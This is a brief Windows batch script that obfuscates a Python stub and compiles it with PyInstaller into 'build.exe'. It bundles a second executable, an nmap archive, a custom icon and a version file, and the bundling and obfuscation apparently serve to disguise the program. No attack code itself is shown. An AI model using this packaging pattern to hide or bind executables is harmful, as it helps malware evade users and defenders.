set key=%random%%random%%random%%random%
set key=%key:~-16%

python .\obf.py
pyinstaller %mode% --onefile --clean --noconfirm "stub.o.py" --key %key% --name "build.exe" ^
    --hidden-import urllib3 --hidden-import ctypes --hidden-import json --hidden-import python3-nmap ^
    --icon "bound/icon.ico" ^
    --add-binary "bound/bound.exe;bound" --add-data "bound/*;bound" ^
    --add-data "nmap.zip;." ^
    --version-file version.txt
